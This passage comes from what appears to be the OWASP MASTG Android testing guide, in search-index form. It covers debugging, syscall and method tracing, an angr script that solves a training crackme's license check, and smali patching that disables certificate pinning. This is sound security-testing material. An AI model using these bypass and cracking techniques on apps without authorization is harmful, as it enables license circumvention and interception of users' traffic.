HelloWorldJNI, then activate the Wait for debugger switch. Then terminate and re-launch the app. It should be suspended automatically.</p> <p>Our objective is to set a breakpoint at the first instruction of the native function <code>Java_sg_vantagepoint_helloworldjni_MainActivity_stringFromJNI</code> before resuming the app. Unfortunately, this isn't possible at this point in the execution because <code>libnative-lib.so</code> isn't yet mapped into process memory, it's loaded dynamically during runtime. To get this working, you'll first use jdb to gently change the process into the desired state.</p> <p>First, resume execution of the Java VM by attaching jdb. You don't want the process to resume immediately though, so pipe the <code>suspend</code> command into jdb:</p> <pre><code>$ adb jdwp\n14342\n$ adb forward tcp:7777 jdwp:14342\n$ { echo \"suspend\"; cat; } | jdb -attach localhost:7777\n</code></pre> <p>Next, suspend the process where the Java runtime loads <code>libnative-lib.so</code>. In jdb, set a breakpoint at the <code>java.lang.System.loadLibrary</code> method and resume the process. After the breakpoint has been reached, execute the <code>step up</code> command, which will resume the process until <code>loadLibrary</code>returns. At this point, <code>libnative-lib.so</code> has been loaded.</p> <pre><code>&gt; stop in java.lang.System.loadLibrary\n&gt; resume\nAll threads resumed.\nBreakpoint hit: \"thread=main\", java.lang.System.loadLibrary(), line=988 bci=0\n&gt; step up\nmain[1] step up\n&gt;\nStep completed: \"thread=main\", sg.vantagepoint.helloworldjni.MainActivity.&lt;clinit&gt;(), line=12 bci=5\n\nmain[1]\n</code></pre> <p>Execute <code>gdbserver</code> to attach to the suspended app. This will cause the app to be suspended by both the Java VM and the Linux kernel (creating a state of \"double-suspension\").</p> <pre><code>$ adb forward tcp:1234 tcp:1234\n$ $TOOLCHAIN/arm-linux-androideabi-gdb libnative-lib.so\nGNU gdb (GDB) 7.7\nCopyright (C) 2014 Free Software Foundation, Inc.\n(...)\n(gdb) target remote :1234\nRemote debugging using :1234\n0xb6de83b8 in ?? ()\n</code></pre>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0032/","title":"MASTG-TECH-0032: Execution Tracing","text":"<p>Besides being useful for debugging, the jdb command line tool offers basic execution tracing functionality. To trace an app right from the start, you can pause the app with the Android \"Wait for Debugger\" feature or a <code>kill -STOP</code> command and attach jdb to set a deferred method breakpoint on any initialization method. Once the breakpoint is reached, activate method tracing with the <code>trace go methods</code> command and resume execution. jdb will dump all method entries and exits from that point onwards.</p> <pre><code>$ adb forward tcp:7777 jdwp:7288\n$ { echo \"suspend\"; cat; } | jdb -attach localhost:7777\nSet uncaught java.lang.Throwable\nSet deferred uncaught java.lang.Throwable\nInitializing jdb ...\n&gt; All threads suspended.\n&gt; stop in com.acme.bob.mobile.android.core.BobMobileApplication.&lt;clinit&gt;()\nDeferring breakpoint com.acme.bob.mobile.android.core.BobMobileApplication.&lt;clinit&gt;().\nIt will be set after the class is loaded.\n&gt; resume\nAll threads resumed.M\nSet deferred breakpoint com.acme.bob.mobile.android.core.BobMobileApplication.&lt;clinit&gt;()\n\nBreakpoint hit: \"thread=main\", com.acme.bob.mobile.android.core.BobMobileApplication.&lt;clinit&gt;(), line=44 bci=0\nmain[1] trace go methods\nmain[1] resume\nMethod entered: All threads resumed.\n</code></pre> <p>The Dalvik Debug Monitor Server (DDMS) is a GUI tool included with Android Studio. It may not look like much, but its Java method tracer is one of the most awesome tools you can have in your arsenal, and it is indispensable for analyzing obfuscated bytecode.</p> <p>DDMS is somewhat confusing, however; it can be launched several ways, and different trace viewers will be launched depending on how a method was traced. There's a standalone tool called \"Traceview\" as well as a built-in viewer in Android Studio, both of which offer different ways to navigate the trace. You'll usually use Android studio's built-in viewer, which gives you a zoomable hierarchical timeline of all method calls. However, the standalone tool is also useful, it has a profile panel that shows the time spent in each method along with the parents and children of each method.</p> <p>To record an execution trace in Android Studio, open the Android tab at the bottom of the GUI. Select the target process in the list and click the little stop watch button on the left. This starts the recording. Once you're done, click the same button to stop the recording. The integrated trace view will open and show the recorded trace. You can scroll and zoom the timeline view with the mouse or trackpad.</p> <p>Execution traces can also be recorded in the standalone Android Device Monitor. The Device Monitor can be started within Android Studio (Tools -&gt; Android -&gt; Android Device Monitor) or from the shell with the <code>ddms</code> command.</p> <p>To start recording tracing information, select the target process in the Devices tab and click Start Method Profiling. Click the stop button to stop recording, after which the Traceview tool will open and show the recorded trace. Clicking any of the methods in the profile panel highlights the selected method in the timeline panel.</p> <p>DDMS also offers a convenient heap dump button that will dump the Java heap of a process to a .hprof file. The Android Studio user guide contains more information about Traceview.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0032/#tracing-system-calls","title":"Tracing System Calls","text":"<p>Moving down a level in the OS hierarchy, you arrive at privileged functions that require the powers of the Linux kernel. These functions are available to normal processes via the system call interface. Instrumenting and intercepting calls into the kernel is an effective method for getting a rough idea of what a user process is doing, and often the most efficient way to deactivate low-level tampering defenses.</p> <p>Strace is a standard Linux utility that is not included with Android by default, but can be easily built from source via the Android NDK. It monitors the interaction between processes and the kernel, being a very convenient way to monitor system calls. However, there's a downside: as strace depends on the <code>ptrace</code> system call to attach to the target process, once anti-debugging measures become active it will stop working.</p> <p>If the \"Wait for debugger\" feature in Settings &gt; Developer options is unavailable, you can use a shell script to launch the process and immediately attach strace (not an elegant solution, but it works):</p> <pre><code>while true; do pid=$(pgrep 'target_process' | head -1); if [[ -n \"$pid\" ]]; then strace -s 2000 - e \"!read\" -ff -p \"$pid\"; break; fi; done\n</code></pre>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0032/#ftrace","title":"Ftrace","text":"<p>Ftrace is a tracing utility built directly into the Linux kernel. On a rooted device, ftrace can trace kernel system calls more transparently than strace can (strace relies on the ptrace system call to attach to the target process).</p> <p>Conveniently, the stock Android kernel on both Lollipop and Marshmallow include ftrace functionality. The feature can be enabled with the following command:</p> <pre><code>echo 1 &gt; /proc/sys/kernel/ftrace_enabled\n</code></pre> <p>The <code>/sys/kernel/debug/tracing</code> directory holds all control and output files related to ftrace. The following files are found in this directory:</p> <ul> <li>available_tracers: This file lists the available tracers compiled into the kernel.</li> <li>current_tracer: This file sets or displays the current tracer.</li> <li>tracing_on: Echo \"1\" into this file to allow/start update of the ring buffer. Echoing \"0\" will prevent further writes into the ring buffer.</li> </ul>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0032/#kprobes","title":"KProbes","text":"<p>The KProbes interface provides an even more powerful way to instrument the kernel: it allows you to insert probes into (almost) arbitrary code addresses within kernel memory. KProbes inserts a breakpoint instruction at the specified address. Once the breakpoint is reached, control passes to the KProbes system, which then executes the user-defined handler function(s) and the original instruction. Besides being great for function tracing, KProbes can implement rootkit-like functionality, such as file hiding.</p> <p>Jprobes and Kretprobes are other KProbes-based probe types that allow hooking of function entries and exits.</p> <p>The stock Android kernel comes without loadable module support, which is a problem because Kprobes are usually deployed as kernel modules. The strict memory protection the Android kernel is compiled with is another issue because it prevents the patching of some parts of Kernel memory. Elfmaster's system call hooking method causes a Kernel panic on stock Lollipop and Marshmallow because the sys_call_table is non-writable. You can, however, use KProbes in a sandbox by compiling your own, more lenient Kernel (more on this later).</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0033/","title":"MASTG-TECH-0033: Method Tracing","text":"<p>In contrast to method profiling, which tells you how frequently a method is being called, method tracing helps you to also determine its input and output values. This technique can prove to be very useful when dealing with applications that have a big codebase and/or are obfuscated.</p> <p>If you prefer a GUI-based approach you can use tools such as  RMS Runtime Mobile Security which enables a more visual experience as well as include several convenience tracing options.</p> <p>If you prefer the command line, Frida offers a useful syntax to query Java classes and methods as well as Java method tracing support for frida-trace via <code>-j</code> (starting on frida-tools 8.0, Frida 12.10).</p> <ul> <li>In Frida scripts: e.g. <code>Java.enumerateMethods('*youtube*!on*')</code> uses globs to take all classes that include \"youtube\" as part of their name and enumerate all methods starting with \"on\".</li> <li>In frida-trace: e.g. <code>-j '*!*certificate*/isu'</code> triggers a case-insensitive query (<code>i</code>), including method signatures (<code>s</code>) and excluding system classes (<code>u</code>).</li> </ul> <p>Refer to the Release Notes for Frida 12.10 for more details on this new feature. To learn more about all options for advanced usage, check the documentation on the official Frida website.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0034/","title":"MASTG-TECH-0034: Native Code Tracing","text":"<p>Native methods tracing can be performed with relative ease compared to Java method tracing. <code>frida-trace</code> is a CLI tool for dynamically tracing function calls. It makes tracing native functions trivial and can be very useful for collecting information about an application.</p> <p>In order to use <code>frida-trace</code>, a Frida server should be running on the device. An example for tracing libc's <code>open</code> function using <code>frida-trace</code> is demonstrated below, where <code>-U</code> connects to the USB device and <code>-i</code> specifies the function to be included in the trace.</p> <pre><code>frida-trace -U -i \"open\" com.android.chrome\n</code></pre> <p></p> <p>Note how, by default, only the arguments passed to the function are shown, but not the return values. Under the hood, <code>frida-trace</code> generates one little JavaScript handler file per matched function in the auto-generated <code>__handlers__</code> folder, which Frida then injects into the process. You can edit these files for more advanced usage such as obtaining the return value of the functions, their input parameters, accessing the memory, etc. Check Frida's JavaScript API for more details.</p> <p>In this case, the generated script which traces all calls to the <code>open</code> function in <code>libc.so</code> is located in <code>__handlers__/libc.so/open.js</code>, it looks as follows:</p> <pre><code>{\n  onEnter: function (log, args, state) {\n    log('open(' +\n      'path=\"' + args[0].readUtf8String() + '\"' +\n      ', oflag=' + args[1] +\n    ')');\n  },\n\n\n  onLeave: function (log, retval, state) {\n      log('\\t return: ' + retval);      \\\\ edited\n  }\n}\n</code></pre> <p>In the above script, <code>onEnter</code> takes care of logging the calls to this function and its two input parameters in the right format. You can edit the <code>onLeave</code> event to print the return values as shown above.</p> <p>Note that libc is a well-known library, Frida is able to derive the input parameters of its <code>open</code> function and automatically log them correctly. But this won't be the case for other libraries or for Android Kotlin/Java code. In that case, you may want to obtain the signatures of the functions you're interested in by referring to Android Developers documentation or by reverse engineer the app first.</p> <p>Another thing to notice in the output above is that it's colorized. An application can have multiple threads running, and each thread can call the <code>open</code> function independently. By using such a color scheme, the output can be easily visually segregated for each thread.</p> <p><code>frida-trace</code> is a very versatile tool and there are multiple configuration options available such as:</p> <ul> <li>Including <code>-I</code> and excluding <code>-X</code> entire modules.</li> <li>Tracing all JNI functions in an Android application using <code>-i \"Java_*\"</code> (note the use of a glob <code>*</code> to match all possible functions starting with \"Java_\").</li> <li>Tracing functions by address when no function name symbols are available (stripped binaries), e.g. <code>-a \"libjpeg.so!0x4793c\"</code>.</li> </ul> <pre><code>frida-trace -U -i \"Java_*\" com.android.chrome\n</code></pre> <p>Many binaries are stripped and don't have function name symbols available with them. In such cases, a function can be traced using its address as well.</p> <pre><code>frida-trace -p 1372 -a \"libjpeg.so!0x4793c\"\n</code></pre>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0035/","title":"MASTG-TECH-0035: JNI Tracing","text":"<p>As detailed in  Reviewing Disassembled Native Code, the first argument passed to every JNI function is a JNI interface pointer. This pointer contains a table of functions that allows native code to access the Android Runtime. Identifying calls to these functions can help with understanding library functionality, such as what strings are created or Java methods are called.</p> <p>jnitrace is a Frida based tool similar to frida-trace which specifically targets the usage of Android's JNI API by native libraries, providing a convenient way to obtain JNI method traces including arguments and return values.</p> <p>You can easily install it by running <code>pip install jnitrace</code> and run it straight away as follows:</p> <pre><code>jnitrace -l libnative-lib.so sg.vantagepoint.helloworldjni\n</code></pre> <p>The <code>-l</code> option can be provided multiple times to trace multiple libraries, or <code>*</code> can be provided to trace all libraries. This, however, may provide a lot of output.</p> <p></p> <p>In the output you can see the trace of a call to <code>NewStringUTF</code> made from the native code (its return value is then given back to Java code, see  Reviewing Disassembled Native Code for more details). Note how similarly to frida-trace, the output is colorized helping to visually distinguish the different threads.</p> <p>When tracing JNI API calls you can see the thread ID at the top, followed by the JNI method call including the method name, the input arguments and the return value. In the case of a call to a Java method from native code, the Java method arguments will also be supplied. Finally jnitrace will attempt to use the Frida backtracing library to show where the JNI call was made from.</p> <p>To learn more about all options for advanced usage, check the documentation on the jnitrace GitHub page.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0036/","title":"MASTG-TECH-0036: Emulation-based Analysis","text":"<p>The Android emulator is based on QEMU, a generic and open source machine emulator. QEMU emulates a guest CPU by translating the guest instructions on-the-fly into instructions the host processor can understand. Each basic block of guest instructions is disassembled and translated into an intermediate representation called Tiny Code Generator (TCG). The TCG block is compiled into a block of host instructions, stored in a code cache, and executed. After execution of the basic block, QEMU repeats the process for the next block of guest instructions (or loads the already translated block from the cache). The whole process is called dynamic binary translation.</p> <p>Because the Android emulator is a fork of QEMU, it comes with all QEMU features, including monitoring, debugging, and tracing facilities. QEMU-specific parameters can be passed to the emulator with the <code>-qemu</code> command line flag. You can use QEMU's built-in tracing facilities to log executed instructions and virtual register values. Starting QEMU with the <code>-d</code> command line flag will cause it to dump the blocks of guest code, micro operations, or host instructions being executed. With the <code>-d_asm</code> flag, QEMU logs all basic blocks of guest code as they enter QEMU's translation function. The following command logs all translated blocks to a file:</p> <pre><code>emulator -show-kernel -avd Nexus_4_API_19 -snapshot default-boot -no-snapshot-save -qemu -d in_asm,cpu 2&gt;/tmp/qemu.log\n</code></pre> <p>Unfortunately, generating a complete guest instruction trace with QEMU is impossible because code blocks are written to the log only at the time they are translated, not when they're taken from the cache. For example, if a block is repeatedly executed in a loop, only the first iteration will be printed to the log. There's no way to disable TB caching in QEMU (besides hacking the source code). Nevertheless, the functionality is sufficient for basic tasks, such as reconstructing the disassembly of a natively executed cryptographic algorithm.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0037/","title":"MASTG-TECH-0037: Symbolic Execution","text":"<p>Symbolic execution is a very useful technique to have in your toolbox, especially while dealing with problems where you need to find a correct input for reaching a certain block of code. In this section, we will solve a simple Android crackme by using the  Angr binary analysis framework as our symbolic execution engine.</p> <p>To demonstrate this technique we'll use a crackme called  Android License Validator. The crackme consists of a single ELF executable file, which can be executed on any Android device by following the instructions below:</p> <pre><code>$ adb push validate /data/local/tmp\n[100%] /data/local/tmp/validate\n\n$ adb shell chmod 755 /data/local/tmp/validate\n\n$ adb shell /data/local/tmp/validate\nUsage: ./validate &lt;serial&gt;\n\n$ adb shell /data/local/tmp/validate 12345\nIncorrect serial (wrong format).\n</code></pre> <p>So far so good, but we know nothing about what a valid license key looks like. To get started, open the ELF executable in a disassembler such as  iaito. The main function is located at offset <code>0x00001874</code> in the disassembly. It is important to note that this binary is PIE-enabled, and iaito chooses to load the binary at <code>0x0</code> as image base address.</p> <p></p> <p>The function names have been stripped from the binary, but luckily there are enough debugging strings to provide us a context to the code. Moving forward, we will start analyzing the binary from the entry function at offset <code>0x00001874</code>, and keep a note of all the information easily available to us. During this analysis, we will also try to identify the code regions which are suitable for symbolic execution.</p> <p></p> <p><code>strlen</code> is called at offset <code>0x000018a8</code>, and the returned value is compared to 0x10 at offset <code>0x000018b0</code>. Immediately after that, the input string is passed to a Base32 decoding function at offset <code>0x00001340</code>. This provides us with valuable information that the input license key is a Base32-encoded 16-character string (which totals 10 bytes in raw). The decoded input is then passed to the function at offset <code>0x00001760</code>, which validates the license key. The disassembly of this function is shown below.</p> <p>We can now use this information about the expected input to further look into the validation function at <code>0x00001760</code>.</p> <pre><code>\u256d (fcn) fcn.00001760 268\n\u2502   fcn.00001760 (int32_t arg1);\n\u2502           ; var int32_t var_20h @ fp-0x20\n\u2502           ; var int32_t var_14h @ fp-0x14\n\u2502           ; var int32_t var_10h @ fp-0x10\n\u2502           ; arg int32_t arg1 @ r0\n\u2502           ; CALL XREF from fcn.00001760 (+0x1c4)\n\u2502           0x00001760      push {r4, fp, lr}\n\u2502           0x00001764      add fp, sp, 8\n\u2502           0x00001768      sub sp, sp, 0x1c\n\u2502           0x0000176c      str r0, [var_20h]                          ; 0x20 ; \"$!\" ; arg1\n\u2502           0x00001770      ldr r3, [var_20h]                          ; 0x20 ; \"$!\" ; entry.preinit0\n\u2502           0x00001774      str r3, [var_10h]                          ; str.\n\u2502                                                                      ; 0x10\n\u2502           0x00001778      mov r3, 0\n\u2502           0x0000177c      str r3, [var_14h]                          ; 0x14\n\u2502       \u256d\u2500&lt; 0x00001780      b 0x17d0\n\u2502       \u2502   ; CODE XREF from fcn.00001760 (0x17d8)\n\u2502      \u256d\u2500\u2500&gt; 0x00001784      ldr r3, [var_10h]                          ; str.\n\u2502       \u2502                                                              ; 0x10 ; entry.preinit0\n\u2502      \u254e\u2502   0x00001788      ldrb r2, [r3]\n\u2502      \u254e\u2502   0x0000178c      ldr r3, [var_10h]                          ; str.\n\u2502      \u254e\u2502                                                              ; 0x10 ; entry.preinit0\n\u2502      \u254e\u2502   0x00001790      add r3, r3, 1\n\u2502      \u254e\u2502   0x00001794      ldrb r3, [r3]\n\u2502      \u254e\u2502   0x00001798      eor r3, r2, r3\n\u2502      \u254e\u2502   0x0000179c      and r2, r3, 0xff\n\u2502      \u254e\u2502   0x000017a0      mvn r3, 0xf\n\u2502      \u254e\u2502   0x000017a4      ldr r1, [var_14h]                          ; 0x14 ; entry.preinit0\n\u2502      \u254e\u2502   0x000017a8      sub r0, fp, 0xc\n\u2502      \u254e\u2502   0x000017ac      add r1, r0, r1\n\u2502      \u254e\u2502   0x000017b0      add r3, r1, r3\n\u2502      \u254e\u2502   0x000017b4      strb r2, [r3]\n\u2502      \u254e\u2502   0x000017b8      ldr r3, [var_10h]                          ; str.\n\u2502      \u254e\u2502                                                              ; 0x10 ; entry.preinit0\n\u2502      \u254e\u2502   0x000017bc      add r3, r3, 2                              ; \"ELF\\x01\\x01\\x01\" ; aav.0x00000001\n\u2502      \u254e\u2502   0x000017c0      str r3, [var_10h]                          ; str.\n\u2502      \u254e\u2502                                                              ; 0x10\n\u2502      \u254e\u2502   0x000017c4      ldr r3, [var_14h]                          ; 0x14 ; entry.preinit0\n\u2502      \u254e\u2502   0x000017c8      add r3, r3, 1\n\u2502      \u254e\u2502   0x000017cc      str r3, [var_14h]                          ; 0x14\n\u2502      \u254e\u2502   ; CODE XREF from fcn.00001760 (0x1780)\n\u2502      \u254e\u2570\u2500&gt; 0x000017d0      ldr r3, [var_14h]                          ; 0x14 ; entry.preinit0\n\u2502      \u254e    0x000017d4      cmp r3, 4                                  ; aav.0x00000004 ; aav.0x00000001 ; aav.0x00000001\n\u2502      \u2570\u2500\u2500&lt; 0x000017d8      ble 0x1784                                 ; likely\n\u2502           0x000017dc      ldrb r4, [fp, -0x1c]                       ; \"4\"\n\u2502           0x000017e0      bl fcn.000016f0\n\u2502           0x000017e4      mov r3, r0\n\u2502           0x000017e8      cmp r4, r3\n\u2502       \u256d\u2500&lt; 0x000017ec      bne 0x1854                                 ; likely\n\u2502       \u2502   0x000017f0      ldrb r4, [fp, -0x1b]\n\u2502       \u2502   0x000017f4      bl fcn.0000170c\n\u2502       \u2502   0x000017f8      mov r3, r0\n\u2502       \u2502   0x000017fc      cmp r4, r3\n\u2502      \u256d\u2500\u2500&lt; 0x00001800      bne 0x1854                                 ; likely\n\u2502      \u2502\u2502   0x00001804      ldrb r4, [fp, -0x1a]\n\u2502      \u2502\u2502   0x00001808      bl fcn.000016f0\n\u2502      \u2502\u2502   0x0000180c      mov r3, r0\n\u2502      \u2502\u2502   0x00001810      cmp r4, r3\n\u2502     \u256d\u2500\u2500\u2500&lt; 0x00001814      bne 0x1854                                 ; likely\n\u2502     \u2502\u2502\u2502   0x00001818      ldrb r4, [fp, -0x19]\n\u2502     \u2502\u2502\u2502   0x0000181c      bl fcn.00001728\n\u2502     \u2502\u2502\u2502   0x00001820      mov r3, r0\n\u2502     \u2502\u2502\u2502   0x00001824      cmp r4, r3\n\u2502    \u256d\u2500\u2500\u2500\u2500&lt; 0x00001828      bne 0x1854                                 ; likely\n\u2502    \u2502\u2502\u2502\u2502   0x0000182c      ldrb r4, [fp, -0x18]\n\u2502    \u2502\u2502\u2502\u2502   0x00001830      bl fcn.00001744\n\u2502    \u2502\u2502\u2502\u2502   0x00001834      mov r3, r0\n\u2502    \u2502\u2502\u2502\u2502   0x00001838      cmp r4, r3\n\u2502   \u256d\u2500\u2500\u2500\u2500\u2500&lt; 0x0000183c      bne 0x1854                                 ; likely\n\u2502   \u2502\u2502\u2502\u2502\u2502   0x00001840      ldr r3, [0x0000186c]                       ; [0x186c:4]=0x270 section..hash ; section..hash\n\u2502   \u2502\u2502\u2502\u2502\u2502   0x00001844      add r3, pc, r3                             ; 0x1abc ; \"Product activation passed. Congratulations!\"\n\u2502   \u2502\u2502\u2502\u2502\u2502   0x00001848      mov r0, r3                                 ; 0x1abc ; \"Product activation passed. Congratulations!\" ;\n\u2502   \u2502\u2502\u2502\u2502\u2502   0x0000184c      bl sym.imp.puts                            ; int puts(const char *s)\n\u2502   \u2502\u2502\u2502\u2502\u2502                                                              ; int puts(\"Product activation passed. Congratulations!\")\n\u2502  \u256d\u2500\u2500\u2500\u2500\u2500\u2500&lt; 0x00001850      b 0x1864\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   ; CODE XREFS from fcn.00001760 (0x17ec, 0x1800, 0x1814, 0x1828, 0x183c)\n\u2502  \u2502\u2570\u2570\u2570\u2570\u2570\u2500&gt; 0x00001854      ldr r3, aav.0x00000288                     ; [0x1870:4]=0x288 aav.0x00000288\n\u2502  \u2502        0x00001858      add r3, pc, r3                             ; 0x1ae8 ; \"Incorrect serial.\" ;\n\u2502  \u2502        0x0000185c      mov r0, r3                                 ; 0x1ae8 ; \"Incorrect serial.\" ;\n\u2502  \u2502        0x00001860      bl sym.imp.puts                            ; int puts(const char *s)\n\u2502  \u2502                                                                   ; int puts(\"Incorrect serial.\")\n\u2502  \u2502        ; CODE XREF from fcn.00001760 (0x1850)\n\u2502  \u2570\u2500\u2500\u2500\u2500\u2500\u2500&gt; 0x00001864      sub sp, fp, 8\n\u2570           0x00001868      pop {r4, fp, pc}                           ; entry.preinit0 ; entry.preinit0 ;\n</code></pre> <p>Discussing all the instructions in the function is beyond the scope of this chapter, instead we will discuss only the important points needed for the analysis. In the validation function, there is a loop present at <code>0x00001784</code> which performs a XOR operation at offset <code>0x00001798</code>. The loop is more clearly visible in the graph view below.</p> <p></p> <p>XOR is a very commonly used technique to encrypt information where obfuscation is the goal rather than security. XOR should not be used for any serious encryption, as it can be cracked using frequency analysis. Therefore, the mere presence of XOR encryption in such a validation logic always requires special attention and analysis.</p> <p>Moving forward, at offset <code>0x000017dc</code>, the XOR decoded value obtained from above is being compared against the return value from a sub-function call at <code>0x000017e8</code>.</p> <p></p> <p>Clearly this function is not complex, and can be analyzed manually, but still remains a cumbersome task. Especially while working on a big code base, time can be a major constraint, and it is desirable to automate such analysis. Dynamic symbolic execution is helpful in exactly those situations. In the above crackme, the symbolic execution engine can determine the constraints on each byte of the input string by mapping a path between the first instruction of the license check (at <code>0x00001760</code>) and the code that prints the \"Product activation passed\" message (at <code>0x00001840</code>).</p> <p></p> <p>The constraints obtained from the above steps are passed to a solver engine, which finds an input that satisfies them - a valid license key.</p> <p>You need to perform several steps to initialize Angr's symbolic execution engine:</p> <ul> <li> <p>Load the binary into a <code>Project</code>, which is the starting point for any kind of analysis in Angr.</p> </li> <li> <p>Pass the address from which the analysis should start. In this case, we will initialize the state with the first instruction of the serial validation function. This makes the problem significantly easier to solve because you avoid symbolically executing the Base32 implementation.</p> </li> <li> <p>Pass the address of the code block that the analysis should reach. In this case, that's the offset <code>0x00001840</code>, where the code responsible for printing the \"Product activation passed\" message is located.</p> </li> <li> <p>Also, specify the addresses that the analysis should not reach. In this case, the code block that prints the \"Incorrect serial\" message at <code>0x00001854</code> is not interesting.</p> </li> </ul> <p>Note that the Angr loader will load the PIE executable with a base address of <code>0x400000</code>, which needs to be added to the offsets from iaito before passing it to Angr.</p> <p>The final solution script is presented below:</p> <pre><code>import angr # Version: 9.2.2\nimport base64\n\nload_options = {}\n\nb = angr.Project(\"./validate\", load_options = load_options)\n# The key validation function starts at 0x401760, so that's where we create the initial state.\n# This speeds things up a lot because we're bypassing the Base32-encoder.\n\noptions = {\n    angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY,\n    angr.options.ZERO_FILL_UNCONSTRAINED_REGISTERS,\n}\n\nstate = b.factory.blank_state(addr=0x401760, add_options=options)\n\nsimgr = b.factory.simulation_manager(state)\nsimgr.explore(find=0x401840, avoid=0x401854)\n\n# 0x401840 = Product activation passed\n# 0x401854 = Incorrect serial\nfound = simgr.found[0]\n\n# Get the solution string from *(R11 - 0x20).\n\naddr = found.memory.load(found.regs.r11 - 0x20, 1, endness=\"Iend_LE\")\nconcrete_addr = found.solver.eval(addr)\nsolution = found.solver.eval(found.memory.load(concrete_addr,10), cast_to=bytes)\nprint(base64.b32encode(solution))\n</code></pre> <p>As discussed previously in the section \"Dynamic Binary Instrumentation\", the symbolic execution engine constructs a binary tree of the operations for the program input given and generates a mathematical equation for each possible path that might be taken. Internally, Angr explores all the paths between the two points specified by us, and passes the corresponding mathematical equations to the solver to return meaningful concrete results. We can access these solutions via <code>simulation_manager.found</code> list, which contains all the possible paths explored by Angr which satisfies our specified search criteria.</p> <p>Take a closer look at the latter part of the script where the final solution string is being retrieved. The address of the string is obtained from address <code>r11 - 0x20</code>. This may appear magical at first, but a careful analysis of the function at <code>0x00001760</code> holds the clue, as it determines if the given input string is a valid license key or not. In the disassembly above, you can see how the input string to the function (in register R0) is stored into a local stack variable <code>0x0000176c      str r0, [var_20h]</code>. Hence, we decided to use this value to retrieve the final solution in the script. Using <code>found.solver.eval</code> you can ask the solver questions like \"given the output of this sequence of operations (the current state in <code>found</code>), what must the input (at <code>addr</code>) have been?\".</p> <p>In ARMv7, R11 is called fp (function pointer), therefore <code>R11 - 0x20</code> is equivalent to <code>fp-0x20</code>: <code>var int32_t var_20h @ fp-0x20</code></p> <p>Next, the <code>endness</code> parameter in the script specifies that the data is stored in \"little-endian\" fashion, which is the case for almost all of the Android devices.</p> <p>Also, it may appear as if the script is simply reading the solution string from the memory of the script. However, it's reading it from the symbolic memory. Neither the string nor the pointer to the string actually exist. The solver ensures that the solution it provides is the same as if the program would be executed to that point.</p> <p>Running this script should return the following output:</p> <pre><code>$ python3 solve.py\nWARNING | ... | cle.loader | The main binary is a position-independent executable. It is being loaded with a base address of 0x400000.\n\nb'JACE6ACIARNAAIIA'\n</code></pre> <p>Now you can run the validate binary on your Android device to verify the solution (see  Android License Validator).</p> <p>You may obtain different solutions using the script, as there are multiple valid license keys possible.</p> <p>To conclude, learning symbolic execution might look a bit intimidating at first, as it requires deep understanding and extensive practice. However, the effort is justified considering the valuable time it can save in contrast to analyzing complex disassembled instructions manually. Typically you'd use hybrid techniques, as in the above example, where we performed manual analysis of the disassembled code to provide the correct criteria to the symbolic execution engine. Please refer to the iOS chapter for more examples on Angr usage.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0038/","title":"MASTG-TECH-0038: Patching","text":"<p>Making small changes to the Android Manifest or bytecode is often the quickest way to fix small annoyances that prevent you from testing or reverse engineering an app. On Android, two issues in particular happen regularly:</p> <ol> <li>You can't intercept HTTPS traffic with a proxy because the app employs SSL pinning.</li> <li>You can't attach a debugger to the app because the <code>android:debuggable</code> flag is not set to <code>\"true\"</code> in the Android Manifest.</li> </ol> <p>In most cases, both issues can be fixed by making minor changes to the app (aka. patching) and then re-signing and repackaging it. Apps that run additional integrity checks beyond default Android code-signing are an exception. In those cases, you have to patch the additional checks as well.</p> <p>The first step is unpacking and disassembling the APK with <code>apktool</code>:</p> <pre><code>apktool d target_apk.apk\n</code></pre> <p>Note: To save time, you may use the flag <code>--no-src</code> if you only want to unpack the APK but not disassemble the code. For example, when you only want to modify the Android Manifest and repack immediately.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0038/#patching-example-disabling-certificate-pinning","title":"Patching Example: Disabling Certificate Pinning","text":"<p>Certificate pinning is an issue for security testers who want to intercept HTTPS communication for legitimate reasons. Patching bytecode to deactivate SSL pinning can help with this. To demonstrate bypassing certificate pinning, we'll walk through an implementation in an example application.</p> <p>Once you've unpacked and disassembled the APK, it's time to find the certificate pinning checks in the Smali source code. Searching the code for keywords such as \"X509TrustManager\" should point you in the right direction.</p> <p>In our example, a search for \"X509TrustManager\" returns one class that implements a custom TrustManager. The derived class implements the methods <code>checkClientTrusted</code>, <code>checkServerTrusted</code>, and <code>getAcceptedIssuers</code>.</p> <p>To bypass the pinning check, add the <code>return-void</code> opcode to the first line of each method. This opcode causes the checks to return immediately. With this modification, no certificate checks are performed, and the application accepts all certificates.</p> <pre><code>.method public checkServerTrusted([LJava/security/cert/X509Certificate;Ljava/lang/String;)V\n  .locals 3\n  .param p1, \"chain\"  # [Ljava/security/cert/X509Certificate;\n  .param p2, \"authType\"   # Ljava/lang/String;\n\n  .prologue\n  return-void      # &lt;-- OUR INSERTED OPCODE!\n  .line 102\n  iget-object v1, p0, Lasdf/t$a;-&gt;a:Ljava/util/ArrayList;\n\n  invoke-virtual {v1}, Ljava/util/ArrayList;-&gt;iterator()Ljava/util/Iterator;\n\n  move-result-object v1\n\n  :goto_0\n  invoke-interface {v1}, Ljava/util/Iterator;-&gt;hasNext()Z\n</code></pre> <p>This modification will break the APK signature, so you'll also have to re-sign the altered APK archive after repackaging it.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0038/#patching-example-making-an-app-debuggable","title":"Patching Example: Making an App Debuggable","text":"<p>Every debugger-enabled process runs an extra thread for handling JDWP protocol packets. This thread is started only for apps that have the <code>android:debuggable=\"true\"</code> flag set in their manifest file's <code>&lt;application&gt;</code> element. This is the typical configuration of Android devices shipped to end users.</p> <p>When reverse engineering apps, you'll often have access to the target app's release build only. Release builds aren't meant to be debugged, that's the purpose of 